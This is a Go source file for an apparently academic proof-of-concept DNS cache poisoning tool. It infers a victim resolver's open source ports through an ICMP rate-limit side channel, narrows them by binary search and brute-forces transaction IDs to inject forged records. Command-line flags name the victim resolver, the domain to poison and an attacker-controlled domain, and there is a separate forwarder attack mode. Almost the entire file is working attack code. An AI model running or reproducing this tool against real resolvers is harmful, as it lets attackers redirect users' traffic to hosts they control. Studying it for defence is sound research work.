package main

import (
	"flag"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/routing"
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

var handle *pcap.Handle
var ethernetLayer *layers.Ethernet
var victimDNSName string
var dnsQueryName string
var authIP net.IP
var resolverIP net.IP
var localIP []net.IP
var defaultJitter uint
var gotReply = false
var attackerControlledDomain string
var attackForwarder bool
var repeatTimes int
var timeGap uint
var auxiliaryDomain string
var soaName string

var jitter uint = 10
var rtt uint = 1 // in ms
var debugOutput = true

const GROUP_SIZE = 50

/* I'm not sure what's this used for. Probably used with older version where multiple IPs is not supported. */
//var sendingChannel chan *outgoingPacket
var backendResolvers = make([]*backendResolver, 0)
var bruteForceShouldBeKilled = false

type backendResolver = struct {
	resolverBackendIP net.IP

	groups             [][]uint16 // = make([][]uint16, 65536)
	groupIDCounter     uint16     // = 3
	groupIDCounterLock *sync.Mutex
	groupSendTime      []time.Time // = make([]time.Time, 65536)

	probeChannel         chan uint16 //= make(chan uint16, 655)
	priorityProbeChannel chan uint16 //= make(chan uint16, 655)
	alwaysOpenPorts      []bool      //= make([]bool, 65536)

	perIPLimitCounter []int //= 6

	networkXmitLock *sync.Mutex
}

//timeout in ms
func dnsRequestSender(timeout uint) {
	for {
		gotReply = false
		sendDNSRequest(uint16(rand.Uint32()), dnsQueryName)
		retryTimes := timeout / 500
		for {
			if !gotReply {
				time.Sleep(500 * time.Millisecond)
				retryTimes--
				if retryTimes == 0 {
					break
				}
			} else {
				if debugOutput {
					fmt.Println("Got reply in", timeout-retryTimes*500, "ms")
				} else {
					fmt.Println("Rx")
				}
				break
			}
		}
		if !attackForwarder {
			dnsQueryName = strconv.Itoa(rand.Int()) + "." + victimDNSName
		} else {
			/* I'm not sure if we should change the nonce. */
			dnsQueryName = strconv.Itoa(rand.Int()) + "." + attackerControlledDomain
		}
	}
}

func receivingThread() {
	for {
		data, captureInfo, err := handle.ReadPacketData()
		if err == pcap.NextErrorTimeoutExpired {
			continue
		} else if err != nil {
			log.Printf("error reading packet: %v", err)
			continue
		}

		// Parse the packet.  We'd use DecodingLayerParser here if we
		// wanted to be really fast.
		packet := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.NoCopy)

		// Find the packets we care about, and print out logging
		// information about them.  All others are ignored.
		if rspNet := packet.NetworkLayer(); rspNet == nil {
			continue
		} else if rspIPLayer := packet.Layer(layers.LayerTypeIPv4); rspIPLayer == nil {
			continue
		} else if rspIP := rspIPLayer.(*layers.IPv4); rspIP == nil {
			continue
		} else if rspIP.Protocol != layers.IPProtocolICMPv4 {
			if rspIP.Id != 2 && rspIP.Protocol == layers.IPProtocolUDP && compareIPv4Addr(rspIP.SrcIP, resolverIP) == 0 {
				rspUDPLayer := packet.Layer(layers.LayerTypeUDP)
				if rspUDPLayer != nil && rspUDPLayer.(*layers.UDP).SrcPort == 53 {
					rspDNSLayer := packet.Layer(layers.LayerTypeDNS)
					if rspDNSLayer != nil {
						rspDNS := rspDNSLayer.(*layers.DNS)
						if rspDNS.QR == true {
							if len(rspDNS.Authorities) != 0 && rspDNS.ResponseCode == layers.DNSResponseCodeNXDomain && string(rspDNS.Questions[0].Name) == dnsQueryName &&
								string(rspDNS.Authorities[0].Name) == victimDNSName && string(rspDNS.Authorities[0].SOA.MName) == soaName {
								fmt.Println("Success!!")
								os.Exit(0)
								//unbound won't cache NS record that leads to SOA NXDOMAIN reply, so we make it positive response
								//This is also used for forwarder attack
							} else if string(rspDNS.Questions[0].Name) == dnsQueryName && rspDNS.ResponseCode == layers.DNSResponseCodeNoErr {
								for _, record := range rspDNS.Answers {
									if record.Type == layers.DNSTypeA {
										fmt.Println("Success2!!")
										os.Exit(0)
									}
								}
							} else if string(rspDNS.Questions[0].Name) == dnsQueryName {
								gotReply = true
							}
						}
					}
				}
			}
			continue
		} else if rspICMPLayer := packet.Layer(layers.LayerTypeICMPv4); rspICMPLayer == nil {
			continue
		} else if rspICMP, ok := rspICMPLayer.(*layers.ICMPv4); !ok {
			continue
		} else if rspICMP.TypeCode != layers.CreateICMPv4TypeCode(layers.ICMPv4TypeDestinationUnreachable, layers.ICMPv4CodePort) &&
			rspICMP.TypeCode != layers.CreateICMPv4TypeCode(layers.ICMPv4TypeDestinationUnreachable, layers.ICMPv4CodeHostAdminProhibited) {
			continue
		} else if nestedIpData := rspICMP.Payload; nestedIpData == nil {
			continue
		} else if nestedIpPacket := gopacket.NewPacket(nestedIpData, layers.LayerTypeIPv4, gopacket.NoCopy); nestedIpPacket == nil {
			continue
		} else if nestedIpLayer := nestedIpPacket.Layer(layers.LayerTypeIPv4); nestedIpLayer == nil {
			continue
		} else if nestedIp := nestedIpLayer.(*layers.IPv4); nestedIp == nil {
			continue
		} else {
			r := getBackendResolver(nestedIp.DstIP)
			if r != nil {

				nestedUDPLayer := nestedIpPacket.Layer(layers.LayerTypeUDP)
				if nestedUDPLayer == nil {
					fmt.Println("nestedUDPLayer == nil")
					continue
				}
				nestedUDP := nestedUDPLayer.(*layers.UDP)
				if nestedUDP == nil {
					fmt.Println("nestedUDP == nil")
					continue
				}

				//got verification packet back
				if nestedIp.Id > 1 {
					//update rtt
					/* Potential BUG: rtt of both resolver may not be the same. */
					newrtt := captureInfo.Timestamp.Sub(r.groupSendTime[nestedIp.Id]).Nanoseconds()/1000000 + 1
					if newrtt >= 0 && newrtt < 5000 {
						var draftJitter uint = 0
						if uint(newrtt) > rtt {
							draftJitter = uint(newrtt) - rtt
						} else {
							draftJitter = (jitter + (rtt - uint(newrtt))) / 2
						}
						if jitter > 30 {
							fmt.Println("Jitter > 30ms!")
							jitter = 10
						} else {
							jitter = draftJitter
						}
						rtt = uint(newrtt)
						if debugOutput {
							fmt.Println("rtt=", rtt, ", jitter=", jitter)
						}
					} else {
						fmt.Println("newrtt error:", newrtt)
					}
					//reduce ratelimit counter
					localIPNum := getLocalIPNum(nestedIp.SrcIP)
					if localIPNum != -1 {
						if r.perIPLimitCounter[localIPNum] >= 0 {
							r.perIPLimitCounter[localIPNum]--
						}
						if r.perIPLimitCounter[localIPNum] < 0 {
							if debugOutput {
								/* This may happen in real attacks. Don't panic :). */
								fmt.Println(r.resolverBackendIP, "bug: perIPLimitCounter < 0")
							}
						}
						if debugOutput {
							fmt.Println(r.resolverBackendIP, "remaining counter:", localIPNum, r.perIPLimitCounter[localIPNum])
						}
					} else {
						if debugOutput {
							fmt.Println("received unwanted ICMP for", nestedIp.SrcIP)
						}
					}
					//process the packet
					binarySearch(r, nestedIp.Id)
				}
				/* This is used to terminate TxID brute forcing earlier if we found the port is indeed not open (i.e., false positive) to avoid wasting time.
				* Check related code to see if this really works before uncommenting this.
				* This may not be useful since brute force only takes ~800ms, which is fairly short.
				* To uncomment this, make clear which backend resolver sent the message so that resolvers won't interfere with each other */
				//else if nestedIp.Id == 2 {
				//	//got verification packet for DNS brute forcing
				//	bruteForceShouldBeKilled = false
				//}
			}
		}
	}
}

func binarySearch(r *backendResolver, id uint16) {
	groupLen := 0
	group := r.groups[id]

	for _, port := range group {
		if port != 65535 {
			groupLen++
		} else {
			break
		}
	}

	if groupLen == 1 {
		//brute force
		r.networkXmitLock.Lock()
		dnsBruteForce(group[0], timeGap, r.resolverBackendIP, auxiliaryDomain)
		r.networkXmitLock.Unlock()
		r.alwaysOpenPorts[group[0]] = true
	} else if groupLen > 1 {
		var repeatTimes1 int
		if repeatTimes > 1 {
			repeatTimes1 = repeatTimes + 1
		} else {
			repeatTimes1 = 1
		}
		for j := 0; j < repeatTimes1; j++ {
			//left
			id := allocateGroupID(r)
			r.groups[id] = make([]uint16, groupLen/2)
			copy(r.groups[id], group[0:groupLen/2])
			for len(r.groups[id]) < GROUP_SIZE {
				r.groups[id] = append(r.groups[id], 65535)
			}
			if debugOutput {
				fmt.Println(r.resolverBackendIP, "bs", r.groups[id][0], "+", groupLen/2)
			} else {
				fmt.Println("Found something interesting!")
			}
			r.priorityProbeChannel <- id

			//right
			id = allocateGroupID(r)
			r.groups[id] = make([]uint16, groupLen-groupLen/2)
			copy(r.groups[id], group[groupLen/2:groupLen])
			for len(r.groups[id]) < GROUP_SIZE {
				r.groups[id] = append(r.groups[id], 65535)
			}
			//fmt.Println(r.resolverBackendIP, "bsr", r.groups[id][0], "+", groupLen-groupLen/2)
			r.priorityProbeChannel <- id
		}
	} else {
		if debugOutput {
			fmt.Println(r.resolverBackendIP, "bug: groupLen <= 0, id=", id)
			for _, port := range group {
				fmt.Print(port)
			}
		}
	}
}

func perIPLimitRecover(r *backendResolver, num int) {
	for {
		if r.perIPLimitCounter[num] < 6 {
			time.Sleep(time.Second + (time.Duration(defaultJitter)+50)*time.Millisecond)
			r.perIPLimitCounter[num]++
		} else {
			time.Sleep((time.Duration(defaultJitter) + 1) * time.Millisecond)
		}
	}
}

func probeSender(r *backendResolver) {
	for {

		var id uint16
		select {
		case id = <-r.priorityProbeChannel:
			break
		case id = <-r.probeChannel:
			break
			//default:
			//	time.Sleep(time.Microsecond)
		}

		/* in favor of brute force when there is no per ip permit and there is only one port in group */
		if getIPwithAvailableCounter(r) == nil && r.groups[id][1] == 65535 {
			//brute force
			r.networkXmitLock.Lock()
			dnsBruteForce(r.groups[id][0], timeGap, r.resolverBackendIP, auxiliaryDomain)
			r.networkXmitLock.Unlock()
			r.alwaysOpenPorts[r.groups[id][0]] = true
			continue
		}
		//test per ip rate limit
		var verifyIP net.IP
		for {
			verifyIP = getIPwithAvailableCounter(r)
			if verifyIP == nil {
				time.Sleep(time.Millisecond)
			} else {
				break
			}
		}

		//send
		ports := r.groups[id]
		r.networkXmitLock.Lock()
		for i := 0; i < GROUP_SIZE; i++ {
			if defaultJitter <= 3 {
				if attackForwarder {
					xmitUDPv4(authIP, r.resolverBackendIP, 53, layers.UDPPort(ports[i]), id, 100)
				} else {
					xmitUDPv4(authIP, r.resolverBackendIP, 53, layers.UDPPort(ports[i]), id, 1)
				}
			} else {
				xmitUDPv4(authIP, r.resolverBackendIP, 53, layers.UDPPort(ports[i]), id, 0)
			}
		}
		time.Sleep(time.Duration(defaultJitter) * time.Millisecond)
		//verify
		xmitUDPv4(verifyIP, r.resolverBackendIP, 53, 65535, id, 10)
		r.groupSendTime[id] = time.Now()
		if rand.Uint32()%100 < 2 {
			if debugOutput {
				fmt.Println(r.resolverBackendIP, "probing", ports[0])
			} else {
				fmt.Println("Continue attacking...")
			}
		}

		//recover global counter
		if !attackForwarder {
			time.Sleep(time.Duration(60-defaultJitter) * time.Millisecond)
		} else {
			/* IDK why I wrote this line. Forwarders should be the same as resolvers if they support global rate limit. */
			time.Sleep(time.Duration(60) * time.Millisecond)
		}
		r.networkXmitLock.Unlock()
	}
}

func portGroupFormer(r *backendResolver, startPort uint, endPort uint) {
	for {
		//divide into groups
		var id uint16 = 0
		var currentGroupSize = 0

		for i := startPort; i <= endPort; i++ {
			/* It's unlikely the port is reused for further queries. But it's still possible. Uncomment here if you feed like port reusing is unlikely to happen. */
			//if r.alwaysOpenPorts[i] {
			//	continue
			//}
			if currentGroupSize%GROUP_SIZE == 0 {
				if id != 0 {
					r.probeChannel <- id
					for j := 1; j < repeatTimes; j++ {
						//dup
						previd := id
						id = allocateGroupID(r)
						r.groups[id] = make([]uint16, len(r.groups[previd]))
						copy(r.groups[id], r.groups[previd])
						r.probeChannel <- id
					}
				}

				id = allocateGroupID(r)
				r.groups[id] = make([]uint16, 0)
			}

			r.groups[id] = append(r.groups[id], uint16(i))
			currentGroupSize++
		}

		//deal with last several cases
		if /*len(r.groups[id]) != 50 &&*/ len(r.groups[id]) != 0 {
			for len(r.groups[id]) != 50 && len(r.groups[id]) != 0 {
				r.groups[id] = append(r.groups[id], 65535)
			}

			r.probeChannel <- id

			for j := 1; j < repeatTimes; j++ {
				//dup
				previd := id
				id = allocateGroupID(r)
				r.groups[id] = make([]uint16, len(r.groups[previd]))
				copy(r.groups[id], r.groups[previd])
				r.probeChannel <- id
			}
		}
	}
}

func main() {

	/* This program only finds & injects DNS responses automatically. Additional authoritative server muting/flooding scripts are needed. */
	/* IPv6 is not supported yet. */
	/* Use "-h to get usage. " */
	/* Author: Keyu Man (kman001@ucr.edu) */
	/* Attaching PoC? */
	/* Add Paper Bio? */
	ifaceName := flag.String("i", "vmnet1", "Interface for attacking. Multiple interfaces are not supported. Multiple IPs per interface is supported.")
	/* If automatic MAC address discovery doesn't work. consider enable this option and feed it to the MAC field. */
	// gateWayMacStr := flag.String("g", "00:11:22:33:44:55", "Gateway Mac")
	authServer := flag.String("a", "", "Authoritative server for the domain to be poisoned.")
	resolver := flag.String("r", "8.8.8.8", "Front-end IP of the victim resolver.")
	resolverBackend := flag.String("b", "", "Back-end IP of the victim resolver.")
	resolverBackendList := flag.String("bn", "", "Back-end IP list of the victim resolver. One per line. This would overwrite \"-b\" and is used when the server has multiple backend IPs.")
	startPort := flag.Uint("s", 1, "Lowest port # for the port scan range, inclusive.")
	endPort := flag.Uint("e", 65534, "Highest port # for the port scan range, inclusive.")
	victimDNSName := flag.String("n", "", "The domain name to be poisoned.")
	dnsQueryTmeout := flag.Uint("t", 4000, "Timeout in ms for outgoing dns queries to the victim resolver. Should be aligned with the resolver's timeout (e.g., BIND is 10000ms by default).")
	defaultJitter := flag.Uint("j", 5, "Time gap between verification packet and the latest probe packet in a group. Increase the value if Jitter is increased.")
	repeatTimes := flag.Uint("R", 1, "Retransmit/Reprobe a group of ports for X times to reduce FNs.")
	timeGap := flag.Uint("tg", 0, "Time gap is us(microseconds) between the TxID brute force packets.")
	auxiliaryDomain := flag.String("ad", "", "Attacker-controlled domain used to host the fake NS for the victim domain and to store the fake A record of the victim domain.")
	debugOutput := flag.Bool("d", false, "Debug output mode.")
	attackerMaliciousDomain := flag.String("f", "", "Attacker controlled domain used in the forwarder attack, this will enable the forwarder attack mode.")
	soaName := flag.String("soa", "", "SOA name of the victim domain on attacker-controlled name server used to indicate the resolver has been poisoned. (Resolver attack only.)")

	flag.Parse()
	//gatewayMac, _ := net.ParseMAC(*gateWayMacStr)
	Main(*ifaceName, net.ParseIP(*authServer), net.ParseIP(*resolver), net.ParseIP(*resolverBackend), *startPort, *endPort, *victimDNSName, *dnsQueryTmeout, *defaultJitter,
		*attackerMaliciousDomain, *resolverBackendList, *debugOutput, *repeatTimes, *timeGap, *auxiliaryDomain, *soaName)
	os.Exit(0)
}

func Main(ifaceName string, authIPArg net.IP, resolverIPArg net.IP, resolverBackendIPArg net.IP, startPort uint, endPort uint, victimDNSNameArg string, dnsQueryTimeout uint,
	defaultJitterArg uint, attackerMaliciousDomainArg string, resolverBackendList string, debugOutputArg bool, repeatTimesArg uint, timeGapArg uint, auxiliaryDomainArg string,
	soaNameArg string) {
	fmt.Println("/***Please make sure to fill every argument carefully and correct. Otherwise the program will crash.***/")
	rand.Seed(time.Now().UnixNano())
	handle, _ = pcap.OpenLive(
		ifaceName,
		65536,
		true,
		pcap.BlockForever,
	)
	err := handle.SetBPFFilter("not host " + authIPArg.To4().String())
	if err != nil {
		fmt.Println("cannot set BPF filter.")
	}
	iface, err := net.InterfaceByName(ifaceName)
	if err != nil {
		fmt.Println("cannot open network interface")
		os.Exit(1)
	}

	if attackerMaliciousDomainArg != "" {
		attackForwarder = true
		fmt.Println("Forwarder Attack Mode!")
		attackerControlledDomain = attackerMaliciousDomainArg
	}

	authIP = authIPArg
	resolverIP = resolverIPArg
	victimDNSName = victimDNSNameArg
	debugOutput = debugOutputArg
	timeGap = timeGapArg
	auxiliaryDomain = auxiliaryDomainArg
	soaName = soaNameArg

	localIP, _ = GetIfaceAddrMulti(iface)
	nonce := strconv.Itoa(rand.Int())

	if !attackForwarder {
		dnsQueryName = nonce + "." + victimDNSName
	} else {
		dnsQueryName = nonce + "." + attackerControlledDomain
	}

	defaultJitter = defaultJitterArg
	repeatTimes = int(repeatTimesArg)

	if resolverBackendList != "" {
		file, err := os.Open(resolverBackendList)
		if err != nil {
			fmt.Println(err)
			os.Exit(10)
		}
		for {
			var resolverIP string
			n, err := fmt.Fscanf(file, "%s", &resolverIP)
			if n <= 0 || err != nil {
				break
			}
			backendResolvers = append(backendResolvers, backendResolverBuilder(net.ParseIP(resolverIP)))
		}
	} else {
		//r1 shouldn't be nil
		r1 := backendResolverBuilder(resolverBackendIPArg)
		backendResolvers = append(backendResolvers, r1)
	}

	//figure out MAC address
	//test if it's in LAN first
	dstMac, err := GetGatewayAddr(iface, handle, backendResolvers[0].resolverBackendIP.To4())
	if err == nil {
		ethernetLayer = &layers.Ethernet{
			SrcMAC:       iface.HardwareAddr,
			DstMAC:       dstMac,
			EthernetType: layers.EthernetTypeIPv4,
		}
		fmt.Println("Mac:", dstMac)
	} else {
		//query routing table
		router, err := routing.New()
		if err != nil {
			fmt.Println(err)
			os.Exit(4)
		}
		_, nextHopIP, _, err := router.Route(backendResolvers[0].resolverBackendIP)
		if err != nil {
			fmt.Println(err)
			os.Exit(5)
		}
		dstMac, err := GetGatewayAddr(iface, handle, nextHopIP.To4())
		if err != nil {
			fmt.Println(err)
			os.Exit(6)
		}
		fmt.Println("MAC:", dstMac)
		ethernetLayer = &layers.Ethernet{
			SrcMAC:       iface.HardwareAddr,
			DstMAC:       dstMac,
			EthernetType: layers.EthernetTypeIPv4,
		}
	}

	go receivingThread()

	for i, ip := range localIP {
		if debugOutput {
			fmt.Println("use IP", ip)
		}
		for _, r := range backendResolvers {
			go perIPLimitRecover(r, i)
		}
	}
	go dnsRequestSender(dnsQueryTimeout)

	for _, r := range backendResolvers {
		go probeSender(r)
		go portGroupFormer(r, startPort, endPort)
		time.Sleep(25 * time.Millisecond)
	}

	time.Sleep(999 * time.Hour)

}

func allocateGroupID(r *backendResolver) uint16 {
	r.groupIDCounterLock.Lock()
	id := r.groupIDCounter
	r.groupIDCounter++
	if r.groupIDCounter == 0 {
		r.groupIDCounter = 3
	}
	r.groupIDCounterLock.Unlock()
	return id
}

func getBackendResolver(resolverIP net.IP) *backendResolver {
	for _, r := range backendResolvers {
		if compareIPv4Addr(r.resolverBackendIP, resolverIP) == 0 {
			return r
		}
	}
	return nil
}

func lockNetwork() {
	for _, r := range backendResolvers {
		r.networkXmitLock.Lock()
	}
}

func unlockNetwork() {
	for _, r := range backendResolvers {
		r.networkXmitLock.Unlock()
	}
}

func getLocalIPNum(ip net.IP) int {
	for i, localip := range localIP {
		if compareIPv4Addr(localip, ip) == 0 {
			return i
		}
	}
	return -1
}

func backendResolverBuilder(backendIP net.IP) *backendResolver {

	if backendIP == nil {
		return nil
	}
	temp := backendResolver{
		resolverBackendIP:    backendIP,
		groups:               make([][]uint16, 65536),
		groupIDCounter:       3,
		groupIDCounterLock:   &sync.Mutex{},
		groupSendTime:        make([]time.Time, 65536),
		probeChannel:         make(chan uint16, 655),
		priorityProbeChannel: make(chan uint16, 655),
		alwaysOpenPorts:      make([]bool, 65536),
		perIPLimitCounter:    make([]int, len(localIP)),
		networkXmitLock:      &sync.Mutex{},
	}
	for i := range temp.perIPLimitCounter {
		temp.perIPLimitCounter[i] = 6
	}
	for i := 0; i < 65536; i++ {
		temp.alwaysOpenPorts[i] = false
	}
	temp.alwaysOpenPorts[53] = true
	temp.alwaysOpenPorts[0] = true
	temp.alwaysOpenPorts[65535] = true
	return &temp

}

//distribute verification to multiple IPs evenly
func getIPwithAvailableCounter(r *backendResolver) net.IP {
	seed := rand.Int() % len(localIP)
	for i := 0; i < len(localIP); i++ {
		if r.perIPLimitCounter[(i+seed)%len(localIP)] > 0 {
			return localIP[(i+seed)%len(localIP)]
		}
	}
	return nil
}
